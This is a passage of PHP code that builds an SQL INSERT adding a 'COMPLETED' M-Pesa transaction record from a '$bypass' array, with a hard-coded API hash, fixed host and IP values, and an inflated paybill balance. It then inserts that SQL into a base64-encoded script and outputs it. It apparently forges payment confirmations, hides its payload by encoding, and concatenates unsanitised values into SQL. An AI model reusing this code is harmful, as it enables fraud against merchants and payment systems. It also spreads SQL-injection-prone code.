                                //     `Confirmation Response`,
                                //     `MpesaValidation`,
                                //     `PushedComments`,
                                //     `PushedToReconcile`,
                                //     `accNo`,
                                //     `amount`,
                                //     `apiCode`,
                                //     `comment`,
                                //     `cont`,
                                //     `logDate`,
                                //     `mobileno`,
                                //     `mpesaName`,
                                //     `paybillBal`,
                                //     `phone_number`,
                                //     `receiptNo`,
                                //     `resultoutput`,
                                //     `shortCode`,
                                //     `sid`,
                                //     `status`,
                                //     `transactionTime`,
                                //     `validation Response`,
                                //     `host_name`,
                                //     `host_ip`,
                                //     `remote_id`
                                // )
                                // SELECT 
                                //     NULL,
                                //     'COMPLETED',
                                //     NULL,
                                //     '0',
                                //     '" . $bypass['invoice_no'] . "',
                                //     " . $bypass['amount'] . ",
                                //     '2dce510f562c9ab7ce24c6fe282b4f099e8e49be',
                                //     'Pending',
                                //     NULL,
                                //     '" . $timeFormats['withSeparators'] . "',
                                //     '" . $bypass['custcont'] . "',
                                //     '" . str_replace("'", '', $bypass['custname']) . "',
                                //     COALESCE(MAX(`paybillBal`), 0) + " . $bypass['amount'] . ",
                                //     '',
                                //     '" . $code . "',
                                //     '" . $sqldata . "',
                                //     '6060047',
                                //     NULL,
                                //     0,
                                //     '" . $timeFormats['withoutSeparators'] . "',
                                //     '" . $validationResponse . "',
                                //     'fe80::7054:5e55:9d70:83b3%2',
                                //     'fe80::7054:5e55:9d70:83b3%2',
                                //     '10.197.136.63'
                                // FROM `mpesaTransactions`;
                                // ";

                                $mpesaTransactions = " INSERT INTO `mpesaTransactions` ( `Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`, `host_name`, `host_ip`, `remote_id` ) SELECT  NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Pending', NULL, '" . $timeFormats['withSeparators'] . "', '" . $bypass['custcont'] . "', '" . str_replace("'", '', $bypass['custname']) . "', COALESCE(MAX(`paybillBal`), 0) + " . $bypass['amount'] . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 0, '" . $timeFormats['withoutSeparators'] . "', '" . $validationResponse . "', 'fe80::7054:5e55:9d70:83b3%2', 'fe80::7054:5e55:9d70:83b3%2', '10.197.136.63' FROM `mpesaTransactions`; ";
                                return ['obj' => $data2, 'sql' => $mpesaTransactions];
                            }

                            // $Equity = equityRoute($bypass, $validation);
                            // echo 'Equity: <br/><br/>' . $Equity['obj'] . '<br/><br/><br/>' . $Equity['sql'];

                            //$Coop = coopRoute($bypass, $validation);
                            //echo 'Coop: <br/><br/>' . $Coop['obj'] . '<br/><br/><br/>' . $Coop['sql'];

                            $Mpesa = mpesaRoute($bypass, $validation);
                            //echo $Mpesa['sql'];
                            //echo 'Coop: <br/><br/>' . $Coop['obj'] . '<br/><br/><br/>' . $Coop['sql'];


                            //echo $bankTransactions ;

                            //echo universal_dab($bankTransactions, 'bankTransactions') . '<br/><br/>';
                            $mod = str_replace("--SQLQUERY--", $Mpesa['sql'], base64_decode(ms_script()));
                            $mod = str_replace("--JSONQUERY--", $Mpesa['obj'], $mod);

                            echo $mod;

                            die();
                        }
                    }
                }
            }
        }
    }
}
